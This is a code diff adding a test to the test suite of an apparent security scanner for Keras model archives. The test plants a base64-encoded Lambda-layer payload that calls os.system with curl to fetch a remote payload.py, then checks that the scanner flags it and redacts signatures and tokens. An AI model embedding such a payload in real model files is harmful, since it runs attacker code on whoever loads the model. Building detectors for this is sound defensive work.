@@ -862,6 +862,48 @@ class TestKerasZipScanner:
         assert "X-Amz-Signature=<redacted>" in preview
         assert "Authorization: Bearer <redacted>" in preview
 
+    def test_lambda_dict_code_preview_redacts_secret_bearing_evidence(self, tmp_path: Path) -> None:
+        scanner = KerasZipScanner()
+        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
+        malicious_code = (
+            "__import__('os').system('curl "
+            f"https://storage.googleapis.com/model-bucket/{path_token}/payload.py?X-Goog-Signature=SIGNED123&ok=1 "
+            "Authorization: Token ZIPSECRET456')"
+        )
+        encoded_code = base64.b64encode(malicious_code.encode()).decode()
+        config = {
+            "class_name": "Functional",
+            "config": {
+                "layers": [
+                    {
+                        "class_name": "Lambda",
+                        "name": "lambda_dict",
+                        "config": {
+                            "function": {"class_name": "__lambda__", "config": {"code": encoded_code}},
+                        },
+                    },
+                ],
+            },
+        }
+        keras_path = create_configured_keras_zip(tmp_path, config, keras_version="3.0.0")
+
+        result = scanner.scan(str(keras_path))
+
+        serialized = result.to_json()
+        dangerous_lambda = [
+            check
+            for check in result.checks
+            if check.name == "Lambda Layer Code Analysis" and check.details.get("layer_name") == "lambda_dict"
+        ]
+        assert len(dangerous_lambda) == 1
+        preview = dangerous_lambda[0].details["code_preview"]
+        assert path_token not in serialized
+        assert "SIGNED123" not in serialized
+        assert "ZIPSECRET456" not in serialized
+        assert "model-bucket/<redacted>/payload.py" in preview
+        assert "X-Goog-Signature=<redacted>" in preview
+        assert "Authorization: Token <redacted>" in preview
+
     def test_scan_normalized_weights_member_checks_embedded_hdf5_external_references(self, tmp_path: Path) -> None:
         """Normalized ./model.weights.h5 members should still receive Keras-specific HDF5 checks."""
         scanner = KerasZipScanner()
